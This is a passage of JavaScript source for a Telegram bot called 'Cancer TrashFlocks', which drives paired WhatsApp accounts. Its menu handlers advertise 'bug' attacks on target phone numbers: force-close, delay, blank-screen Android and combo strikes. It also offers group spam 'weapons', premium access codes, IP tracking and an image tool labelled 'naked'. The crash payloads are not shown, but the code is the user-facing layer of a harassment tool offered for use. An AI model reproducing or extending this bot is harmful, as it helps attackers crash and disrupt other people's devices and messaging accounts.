        const targetUser    = args[1].replace("@", "");
        const generatedCode = crypto.randomBytes(3).toString("hex").toUpperCase();

        const codes = loadAccessCodes();
        codes[generatedCode] = { target: targetUser };
        saveAccessCodes(codes);

        return ctx.replyWithHTML(
            `<blockquote><b>🎫 NEW ACCESS CODE</b></blockquote>\n` +
            `⌘ <b>Target:</b> @${targetUser}\n` +
            `⌘ <b>Code:</b> <code>${generatedCode}</code>\n` +
            `⌘ <b>Status:</b> Sekali Pakai\n\n` +
            `<i>User harus mengetik:</i> <code>/start ${generatedCode}</code>`
        );
    } catch (e) {
        console.log("creatkode error:", e?.message);
    }
});

// ==========================================
// [ ACTIONS GRUP ONLY ]
// ==========================================
// ─── LIST TRASH → tampilkan 2 button dulu ───
bot.action("listtrash", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const gagahMsg =
        `<blockquote expandable>💀 <b>CANCER TRASHFLOCKS — PILIH MODE</b> 💀</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔═══════ TRASH MENU ═══════════╗\n\n` +
        `  Pilih mode serangan::\n\n` +
        `  💀 MURBUG SPAM\n` +
        `  └ Semua fitur bug untuk\n` +
        `    grup murbug terdaftar\n\n` +
        `  🔒 PRIVAT BUGS\n` +
        `  └ Bug khusus private chat\n` +
        `    & nomor target langsung\n\n` +
        `╚══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(gagahMsg, { parse_mode: "HTML", reply_markup: btnTrashMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("listtrash error:", e?.message);
    }
});

// ─── TRASH MURBUG ───
bot.action("trash_murbug", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const murbugMsg =
        `<blockquote expandable>💀 <b>MURBUG SPAM — ARSENAL</b> 💀</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔════════════════════════════════╗\n` +
        `║   ░▒▓ CANCER WEAPONS ▓▒░      ║\n` +
        `╠════════════════════════════════╣\n\n` +
        `  ⚡ /trash\n` +
        `  │  Forclose Attack — NEW\n` +
        `  │  ██████████ [ ULTRA ]\n\n` +
        `  💥 /invasion\n` +
        `  │  Combination Strike — NEW\n` +
        `  │  ████████░░ [ HIGH ]\n\n` +
        `  🔥 /omega\n` +
        `  │  Delay Hard Attack\n` +
        `  │  █████████░ [ MAX ]\n\n` +
        `  🌀 /kuantum\n` +
        `  │  Quantum Delay Combo\n` +
        `  │  ████████░░ [ HIGH ]\n\n` +
        `  💣 /modols\n` +
        `  │  Blank Android Strike\n` +
        `  │  ████████░░ [ HIGH ]\n\n` +
        `╠════════════════════════════════╣\n` +
        `║  "No mercy. No remnants."      ║\n` +
        `╚════════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(murbugMsg, { parse_mode: "HTML", reply_markup: {
            inline_keyboard: [[{ text: "◀ KEMBALI", callback_data: "listtrash" }]]
        }});
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("trash_murbug error:", e?.message);
    }
});

// ─── TRASH PRIVAT → isi sama seperti trashshow privat ───
bot.action("trash_privat", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const privatMsg =
        `<blockquote expandable>🔒 <b>PRIVAT BUGS — ARSENAL</b> 🔒</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔════════════════════════════════╗\n` +
        `║   ░▒▓ PRIVAT WEAPONS ▓▒░      ║\n` +
        `╠════════════════════════════════╣\n\n` +
        `  ☠️  /cancerforce [62xx]\n` +
        `  │  Force Close Attack\n` +
        `  │  ████░█████ [ ULTRA ]\n\n` +
        `  💀 /cancercombi [62xx]\n` +
        `  │  Combination Strike\n` +
        `  │  █████░████ [ HIGH ]\n\n` +
        `  🔥 /cancerdelay [62xx]\n` +
        `  │  Delay Hard Attack\n` +
        `  │  ████░█████ [ MAX ]\n\n` +
        `  🌑 /cancerblank [62xx]\n` +
        `  │  Blank Screen Android\n` +
        `  │  █████░████ [ HIGH ]\n\n` +
        `  💣 /cancercombo [62xx]\n` +
        `  │  Full Combo Strike\n` +
        `  │  ████░█████ [ ULTRA ]\n\n` +
        `╠════════════════════════════════╣\n` +
        `║  Butuh sender aktif dulu!      ║\n` +
        `║  → /addsender 628xxx           ║\n` +
        `╚════════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(privatMsg, { parse_mode: "HTML", reply_markup: {
            inline_keyboard: [[{ text: "◀ KEMBALI", callback_data: "listtrash" }]]
        }});
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("trash_privat error:", e?.message);
    }
});

bot.action("back_start", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const userStatus = getStatus(ctx.from.id);
    const startMsg =
        `<b>[ CANCER V20 ENGINE ]</b>\n\n` +
        `• ♅<tg-emoji emoji-id="5465262274031659421"></tg-emoji> User   : <code>${ctx.from.first_name}</code>\n` +
        `• ♅<tg-emoji emoji-id="5463277406435422003"></tg-emoji> Status : <b>${userStatus}</b>\n\n` +
        `Kembali ke menu utama:`;
    try {
        await ctx.editMessageCaption(startMsg, { parse_mode: "HTML", reply_markup: btnUtama.getMainKeyboard() });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("back_start error:", e?.message);
    }
});

bot.action("tqto", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const gagahMsg =
        `<blockquote expandable>🙏 <b>CANCER TRASHFLOCKS — THANKS TO</b> 🙏</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ WITH LOVE FROM ════════╗\n\n` +
        `  🌟 The Creator\n` +
        `  └ Its Dric\n` +
        `     Bot ini lahir karena dia.\n\n` +
        `  🙌 Special Support\n` +
        `  ├ My God       — The Greatest\n` +
        `  ├ My Girl      — Love & Support\n` +
        `  └ All Friends  — Ride or Die\n\n` +
        `  💀 The Real MVPs\n` +
        `  └ All Cancer Users\n` +
        `     Kalian adalah support\n` +
        `     yang membuat project ini berhasil.\n\n` +
        `  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `  Built with    : Node.js\n` +
        `  Framework     : Telegraf + Baileys\n` +
        `  Version       : 20.0.0\n` +
        `  Contact       : @Pelecehann\n\n` +
        `╚══════════════════════════════╝` +
        `</code></pre>\n` +
        `<blockquote><i>🔥 "Terimakasih atas semua support. Gunakan dengan bijak." 🔥</i></blockquote>`;
    try {
        await ctx.editMessageCaption(gagahMsg, { parse_mode: "HTML", reply_markup: btnKembali });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("tqto error:", e?.message);
    }
});

bot.action("fiturpg1", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const txt =
        `<b>[ MENU FITUR <tg-emoji emoji-id="5463081281048818043"></tg-emoji> ]</b>\n\n` +
        `<b>👑 AKSES</b>\n` +
        `├ /addprem - Tambah Premium\n` +
        `├ /delprem - Hapus Premium\n` +
        `└ /addadmin - Tambah Admin\n\n` +
        `<b>🏘️ GRUP</b>\n` +
        `├ /addmurbug - Izinkan Grup\n` +
        `├ /delmurbug - Hapus Grup\n` +
        `└ /listmurbug - List Grup Aktif\n\n` +
        `<b>🚫 BLOCK CMD</b>\n` +
        `├ /blockcmd [cmd] - Block Fitur di Grup\n` +
        `├ /delblockcmd [cmd] - Hapus Block\n` +
        `└ /listblockcmd - List Fitur Terblokir\n\n` +
        `<b>🛡️ ANTI FEATURES</b>\n` +
        `├ /antiforward - Toggle Anti Forward\n` +
        `├ /antilink - Toggle Anti Link\n` +
        `├ /antipromosi - Toggle Anti Promosi\n` +
        `├ /antifoto - Toggle Anti Foto\n` +
        `├ /antivideo - Toggle Anti Video\n` +
        `├ /antistiker - Toggle Anti Stiker\n` +
        `└ /listanti - Status Semua Anti\n\n` +
        `<b>🔧 MAINTENANCE</b>\n` +
        `├ /maintenance - Aktifkan Maintenance\n` +
        `└ /offmaintenance - Nonaktifkan Maintenance`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnNavigasi1 });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("fitur_pg1 error:", e?.message);
    }
});

bot.action("fiturpg2", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const txt =
        `<blockquote expandable>⚙️ <b>CANCER TRASHFLOCKS — SISTEM & ENGINE</b> ⚙️</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔═══════ IND FEATURES ═════════╗\n\n` +
        `  ⚡ WHATSAPP SYSTEM\n` +
        `  ├ /connect\n` +
        `  │  └ Tautkan nomor WA ke bot\n` +
        `  ├ /listsender\n` +
        `  │  └ Lihat nomor WA aktif\n` +
        `  │    [ Khusus Private Chat ]\n` +
        `  └ /delsender\n` +
        `     └ Hapus nomor WA\n` +
        `       [ Khusus Private Chat ]\n\n` +
        `  🔁 ENGINE\n` +
        `  └ /restart\n` +
        `     └ Reboot seluruh engine\n` +
        `       bot secara paksa\n\n` +
        `  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `  Engine  : Baileys WA Link\n` +
        `  Runtime : Node.js v18+\n\n` +
        `╚══════════════════════════════╝` +
        `</code></pre>\n` +
        `<blockquote><i>⚡ Engine aktif & siap eksekusi.</i></blockquote>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnNavigasi2 });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("fitur_pg2 error:", e?.message);
    }
});

bot.action("none", async (ctx) => {
    await ctx.answerCbQuery().catch(() => {});
});

// ==========================================
// [ FITURE MENU ACTION ]
// ==========================================
bot.action("fitureMenu", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const txt =
        `<blockquote expandable>⚙️ <b>CANCER TRASHFLOCKS — FITURE</b> ⚙️</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ FITURE MENU ═══════════╗\n\n` +
        `  🛡️ GROUP    : Anti-features\n` +
        `  👑 MURBUG   : Manajemen akses\n` +
        `  ⚙️ CONTROL  : Maintenance\n` +
        `  🎮 PLAYED   : Fun & Tools\n\n` +
        `  Pilih menu di bawah:\n\n` +
        `╚══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnFitureMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("fitureMenu error:", e?.message);
    }
});

// ─── GROUP MENU ───
bot.action("fitureGroup", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const chatId = ctx.chat.id.toString();
    const on = "✔️"; const off = "❌";
    const txt =
        `<blockquote expandable>🛡️ <b>GROUP PROTECTION</b> 🛡️</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ ANTI FEATURES ══════════╗\n\n` +
        `  ↩️  Anti Forward  : ${getMurbugSetting(chatId,"antiforward") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
        `  🔗  Anti Link     : ${getMurbugSetting(chatId,"antilink") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
        `  📢  Anti Promosi  : ${getMurbugSetting(chatId,"antipromosi") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
        `  📷  Anti Foto     : ${getMurbugSetting(chatId,"antifoto") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
        `  🎥  Anti Video    : ${getMurbugSetting(chatId,"antivideo") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
        `  🎭  Anti Stiker   : ${getMurbugSetting(chatId,"antistiker") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
        `  ☠️  Anti Toxic    : ${getMurbugSetting(chatId,"antitoxic") ? "AKTIF  ✔️" : "OFF    ❌"}\n\n` +
        `  Klik tombol untuk toggle:\n\n` +
        `╚═══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnGroupMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
        if (!e?.message?.includes("message is not modified")) console.log("fitureGroup error:", e?.message);
    }
});

// ─── TOGGLE ANTI via button ───
const antiToggleMap = {
    "tgl_antiforward": { key: "antiforward", icon: "↩️", label: "Anti Forward" },
    "tgl_antilink":    { key: "antilink",    icon: "🔗", label: "Anti Link" },
    "tgl_antipromosi": { key: "antipromosi", icon: "📢", label: "Anti Promosi" },
    "tgl_antifoto":    { key: "antifoto",    icon: "📷", label: "Anti Foto" },
    "tgl_antivideo":   { key: "antivideo",   icon: "🎥", label: "Anti Video" },
    "tgl_antistiker":  { key: "antistiker",  icon: "🎭", label: "Anti Stiker" },
    "tgl_antitoxic":   { key: "antitoxic",   icon: "☠️", label: "Anti Toxic" },
};

Object.entries(antiToggleMap).forEach(([action, { key, icon, label }]) => {
    bot.action(action, async (ctx) => {
        if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
        if (!isOwnerOrAdmin(ctx.from.id)) return ctx.answerCbQuery("❌ Akses ditolak!").catch(() => {});
        const chatId = ctx.chat.id.toString();
        const newVal = !getMurbugSetting(chatId, key);
        setMurbugSetting(chatId, key, newVal);
        await ctx.answerCbQuery(`${icon} ${label}: ${newVal ? "AKTIF ✔️" : "NONAKTIF ❌"}`).catch(() => {});
        // Refresh tampilan
        const on = "✔️"; const off = "❌";
        const txt =
            `<blockquote expandable>🛡️ <b>GROUP PROTECTION</b> 🛡️</blockquote>\n` +
            `<pre><code class="language-yaml">` +
            `╔══════ ANTI FEATURES ══════════╗\n\n` +
            `  ↩️  Anti Forward  : ${getMurbugSetting(chatId,"antiforward") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
            `  🔗  Anti Link     : ${getMurbugSetting(chatId,"antilink") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
            `  📢  Anti Promosi  : ${getMurbugSetting(chatId,"antipromosi") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
            `  📷  Anti Foto     : ${getMurbugSetting(chatId,"antifoto") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
            `  🎥  Anti Video    : ${getMurbugSetting(chatId,"antivideo") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
            `  🎭  Anti Stiker   : ${getMurbugSetting(chatId,"antistiker") ? "AKTIF  ✔️" : "OFF    ❌"}\n` +
            `  ☠️  Anti Toxic    : ${getMurbugSetting(chatId,"antitoxic") ? "AKTIF  ✔️" : "OFF    ❌"}\n\n` +
            `  Klik tombol untuk toggle:\n\n` +
            `╚═══════════════════════════════╝` +
            `</code></pre>`;
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnGroupMenu }).catch(() => {});
    });
});

bot.action("statusAnti", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    await ctx.answerCbQuery("Ini status real-time semua anti-features").catch(() => {});
});

// ─── MURBUG MENU ───
bot.action("fiture_murbug", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const txt =
        `<blockquote expandable>👑 <b>MURBUG MANAGEMENT</b> 👑</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ MURBUG MENU ════════════╗\n\n` +
        `  Gunakan command berikut:\n\n` +
        `  Premium\n` +
        `  ├ /addprem @user\n` +
        `  └ /delprem @user\n\n` +
        `  Admin\n` +
        `  ├ /addadmin @user\n` +
        `  └ /deladmin @user\n\n` +
        `  Block CMD\n` +
        `  ├ /blockcmd [cmd]\n` +
        `  ├ /delblockcmd [cmd]\n` +
        `  └ /listblockcmd\n\n` +
        `  Murbug\n` +
        `  ├ /addmurbug\n` +
        `  ├ /delmurbug\n` +
        `  └ /listmurbug\n\n` +
        `╚═══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnMurbugMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
    }
});

// Button MURBUG menu → redirect ke command info
["mb_addprem","mb_delprem","mb_addadmin","mb_deladmin","mb_blockcmd","mb_delblock","mb_addmurbug","mb_delmurbug"].forEach(a => {
    bot.action(a, async (ctx) => {
        const map = {
            "mb_addprem":   "/addprem @username",
            "mb_delprem":   "/delprem @username",
            "mb_addadmin":  "/addadmin @username",
            "mb_deladmin":  "/deladmin @username",
            "mb_blockcmd":  "/blockcmd [nama_command]",
            "mb_delblock":  "/delblockcmd [nama_command]",
            "mb_addmurbug": "/addmurbug (di grup tujuan)",
            "mb_delmurbug": "/delmurbug (di grup tujuan)",
        };
        await ctx.answerCbQuery(`Ketik: ${map[a]}`).catch(() => {});
    });
});

bot.action("mb_listmurbug", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery().catch(() => {});
    // Tampilkan listmurbug inline
    try {
        const data = loadJSON(murbugFile);
        const settings = loadMurbugSettings();
        let list =
            `<pre><code class="language-yaml">` +
            `╔══════ MURBUG LIST ════════════╗\n\n` +
            `  Total : ${data.length} Grup\n\n`;
        if (data.length === 0) {
            list += `  Belum ada grup terdaftar.\n\n`;
        } else {
            data.forEach((id, i) => {
                const s = settings[id] || {};
                list += `  [${i+1}] ${id}\n`;
            });
            list += `\n`;
        }
        list += `╚═══════════════════════════════╝</code></pre>`;
        await ctx.editMessageCaption(list, { parse_mode: "HTML", reply_markup: {
            inline_keyboard: [[{ text: "KEMBALI", callback_data: "fiture_murbug", style: "Primary" }]]
        }});
        await ctx.answerCbQuery();
    } catch (e) { await ctx.answerCbQuery().catch(() => {}); }
});

// ─── CONTROL MENU ───
bot.action("fitureControl", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const status = loadMaintenance() ? "🔴 MAINTENANCE ON" : "🟢 ONLINE";
    const txt =
        `<blockquote expandable>⚙️ <b>CONTROL PANEL</b> ⚙️</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ CONTROL MENU ═══════════╗\n\n` +
        `  Bot Status : ${status}\n\n` +
        `  🔧 Maintenance\n` +
        `  ├ ON  → Block semua user\n` +
        `  └ OFF → Bot normal kembali\n\n` +
        `  📢 Set Channel\n` +
        `  └ Edit CHANNEL_USERNAME\n` +
        `    di settings/config.js\n\n` +
        `╚═══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnControlMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
    }
});

bot.action("ctrl_mainton", async (ctx) => {
    if (!isOwner(ctx)) return ctx.answerCbQuery("❌ Khusus Owner!").catch(() => {});
    saveMaintenance(true);
    await ctx.answerCbQuery("🔧 Maintenance AKTIF!").catch(() => {});
    // Refresh control menu
    const txt =
        `<blockquote expandable>⚙️ <b>CONTROL PANEL</b> ⚙️</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ CONTROL MENU ═══════════╗\n\n` +
        `  Bot Status : 🔴 MAINTENANCE ON\n\n` +
        `  Semua user diblokir.\n` +
        `  Hanya Owner yang bisa akses.\n\n` +
        `╚═══════════════════════════════╝` +
        `</code></pre>`;
    await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnControlMenu }).catch(() => {});
});

bot.action("ctrl_maintoff", async (ctx) => {
    if (!isOwner(ctx)) return ctx.answerCbQuery("❌ Khusus Owner!").catch(() => {});
    saveMaintenance(false);
    await ctx.answerCbQuery("✔️ Maintenance NONAKTIF!").catch(() => {});
    const txt =
        `<blockquote expandable>⚙️ <b>CONTROL PANEL</b> ⚙️</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ CONTROL MENU ═══════════╗\n\n` +
        `  Bot Status : 🟢 ONLINE\n\n` +
        `  Bot normal kembali.\n` +
        `  Semua user bisa akses.\n\n` +
        `╚═══════════════════════════════╝` +
        `</code></pre>`;
    await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnControlMenu }).catch(() => {});
});

bot.action("ctrl_setchannel", async (ctx) => {
    await ctx.answerCbQuery("Edit CHANNEL_USERNAME di settings/config.js").catch(() => {});
});

// ─── PLAYED MENU ───
bot.action("fiture_played", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const txt =
        `<blockquote expandable>🎮 <b>PLAYED & TOOLS</b> 🎮</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ PLAYED MENU ════════════╗\n\n` +
        `  🧠 /iqtest     - Tes IQ kamu\n` +
        `  🎵 /brat       - Brat generator\n` +
        `  🌐 /getcode    - Get source code\n` +
        `  📍 /trackip    - Track IP address\n` +
        `  🎵 /tiktokdl   - Download TikTok\n` +
        `  🔗 /tourl      - Media to URL\n` +
        `  🖼️  /tonaked    - Remove bg/naked\n` +
        `  📄 /enchtml    - Encode HTML file\n` +
        `  📱 /ssiphone   - Screenshot iPhone\n` +
        `  🗂️  /csessions  - Clear sessions\n\n` +
        `  Klik button untuk cara pakai:\n\n` +
        `╚═══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnPlayedMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
    }
});

const playedCmdMap = {
    "pl_iqtest":   { cmd: "/iqtest",              info: "Tes IQ kamu" },
    "pl_brat":     { cmd: "/brat [teks]",         info: "Generate brat aesthetic" },
    "pl_getcode":  { cmd: "/getcode [link]",       info: "Ambil source code website" },
    "pl_trackip":  { cmd: "/trackip [ip/domain]", info: "Track lokasi IP address" },
    "pl_tiktokdl": { cmd: "/tiktokdl [url]",      info: "Download video TikTok" },
    "pl_tourl":    { cmd: "/tourl [reply media]",  info: "Convert media jadi URL" },
    "pl_tonaked":  { cmd: "/tonaked [reply img]",  info: "Remove background image" },
    "pl_enchtml":  { cmd: "/enchtml [reply file]", info: "Encode file jadi HTML" },
    "pl_ssiphone": { cmd: "/ssiphone [url]",       info: "Screenshot tampilan iPhone" },
    "pl_csessions": { cmd: "/csessions",           info: "Bersihkan session files" },
};

Object.entries(playedCmdMap).forEach(([action, { cmd, info }]) => {
    bot.action(action, async (ctx) => {
        await ctx.answerCbQuery(`${info} → Ketik: ${cmd}`).catch(() => {});
    });
});

// ─── CONNECT MENU ───
bot.action("connectMenu", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery("Hanya untuk grup!").catch(() => {});
    const senderCount = (() => {
        try {
            if (!fs.existsSync("./session")) return 0;
            return fs.readdirSync("./session", { withFileTypes: true }).filter(e => e.isDirectory()).length;
        } catch { return 0; }
    })();
    const sock = getAnyActiveSock();
    const waStatus = sock ? "🟢 Online" : "🔴 Offline";
    const txt =
        `<blockquote expandable>📡 <b>CONNECT — WHATSAPP</b> 📡</blockquote>\n` +
        `<pre><code class="language-yaml">` +
        `╔══════ CONNECTION INFO ════════╗\n\n` +
        `  WA Status : ${waStatus}\n` +
        `  Sender    : ${senderCount} Nomor\n\n` +
        `  Cara Connect:\n` +
        `  1. Chat bot secara private\n` +
        `  2. Ketik /addsender 628xxx\n` +
        `  3. Masukkan pairing code\n` +
        `     di WA → Perangkat Tertaut\n\n` +
        `  Pairing Code:\n` +
        `  └ CNCR-DRIC (custom code)\n\n` +
        `╚══════════════════════════════╝` +
        `</code></pre>`;
    try {
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: btnConnectMenu });
        await ctx.answerCbQuery();
    } catch (e) {
        await ctx.answerCbQuery().catch(() => {});
    }
});

bot.action("conn_listsender", async (ctx) => {
    if (!isGroup(ctx)) return ctx.answerCbQuery().catch(() => {});
    try {
        const dirs = fs.existsSync("./session") ?
            fs.readdirSync("./session", { withFileTypes: true }).filter(e => e.isDirectory()).map(e => e.name) : [];
        let txt =
            `<pre><code class="language-yaml">` +
            `╔══════ LIST SENDER ════════════╗\n\n`;
        if (dirs.length === 0) {
            txt += `  Belum ada sender terhubung.\n\n`;
        } else {
            dirs.forEach((d, i) => {
                const s = global.activeSenders?.get(d);
                const st = s?.ws?.readyState === 1 ? "🟢" : "🔴";
                txt += `  ${st} [${i+1}] +${d}\n`;
            });
            txt += `\n`;
        }
        txt += `╚═══════════════════════════════╝</code></pre>`;
        await ctx.editMessageCaption(txt, { parse_mode: "HTML", reply_markup: {
            inline_keyboard: [[{ text: "KEMBALI", callback_data: "connectMenu", style: "Primary" }]]
        }});
        await ctx.answerCbQuery();
    } catch (e) { await ctx.answerCbQuery().catch(() => {}); }
});

// ==========================================
// [ ACTIONS PRIVATE ONLY ]
// ==========================================

bot.action("back", async (ctx) => {
    if (!isPrivate(ctx)) {
        return ctx.answerCbQuery("Hanya untuk Private Chat!").catch(() => {});
    }

    try {
        const runtime = getBotRuntime();

        let senderCount = 0;
        let senderStatus = "🔴 Offline";
        try {
            if (fs.existsSync("./session")) {
                const entries = fs.readdirSync("./session", { withFileTypes: true });
                senderCount = entries.filter(e => e.isDirectory()).length;
            }
            const sock = global.waSocket || global.conn;
            if (sock?.ws?.readyState === 1) senderStatus = "🟢 Online";
        } catch {}

        const userStatusPv = getStatus(ctx.from.id);

        const menuMessage =
            `<blockquote expandable><b>🦀 Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs 🦀</b></blockquote>\n` +
            `<pre><code class="language-yaml">` +
            `╔══════ CANCER V20 ══════╗\n\n` +
            `  Bot     : Cancer TrashFlocks\n` +
            `  Dev     : Its Dric\n` +
            `  Version : 20.0.0\n` +
            `  Prefix  : Slash [ / ]\n` +
            `  Runtime : ${runtime}\n\n` +
            `  User    : ${ctx.from.first_name}\n` +
            `  ID      : ${ctx.from.id}\n` +
            `  Status  : ${userStatusPv}\n\n` +
            `  Sender  : ${senderCount} Nomor\n` +
            `  WA      : ${senderStatus}\n\n` +
            `  Mode    : ✉️ Private Chat\n` +
            `╚═══════════════════════╝` +
            `</code></pre>\n` +
            `<blockquote><i>Selamat datang! Pilih menu di bawah.</i></blockquote>`;

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: thumbnailurl,
                caption: menuMessage,
                parse_mode: "HTML"
            },
            {
                reply_markup: getPrivateMainKeyboard()
            }
        );

        await ctx.answerCbQuery();

    } catch (e) {
        console.log("back error:", e?.message);
        await ctx.answerCbQuery().catch(() => {});
    }
});

bot.action("settings", async (ctx) => {
    if (!isPrivate(ctx)) {
        return ctx.answerCbQuery("Hanya untuk Private Chat!").catch(() => {});
    }
    try {
        const runtime = getBotRuntime();
        const controlsMenu =
            `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n` +
            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
            `<b>♅ <tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5258023599419171861">🔧</tg-emoji> Version : 20.0.0</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5462957817918926146"></tg-emoji> Language : JavaScript</b>\n` +
            `<b>♅<tg-emoji emoji-id="5352752036595116992"></tg-emoji> Prefix : Slash [ / ]</b>\n` +
            `<b>♅<tg-emoji emoji-id="5188283260496536188"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
            `<b>♅<tg-emoji emoji-id="5215327832040811010"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
            `╭───⊱<b> ( 🍁 ) Controls° - Menu</b>\n` +
            `│⌘ /delsessions\n` +
            `│╰┈➤ Delete Sessions\n` +
            `│⌘ /addsender 62xx\n` +
            `│╰┈➤ Add Sender Whatsapp\n` +
            `│⌘ /addadmin ID\n` +
            `│╰┈➤ Add Admin Users\n` +
            `│⌘ /deladmin ID\n` +
            `│╰┈➤ Delete Admin Users\n` +
            `│⌘ /addprem ID\n` +
            `│╰┈➤ Add Premium Users\n` +
            `│⌘ /delprem ID\n` +
            `│╰┈➤ Delete Premium Users\n` +
            `╰───────────────⊱`;
        const button = [[{ text: "「 ♱ 」Cancer BACK", callback_data: "back", style: "Danger", icon_custom_emoji_id: "5462990652943904884" }]];
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: button }
        });
        await ctx.answerCbQuery();
    } catch (e) {
        console.log("settings error:", e?.message);
        await ctx.answerCbQuery().catch(() => {});
    }
});

bot.action("toolsmenu", async (ctx) => {
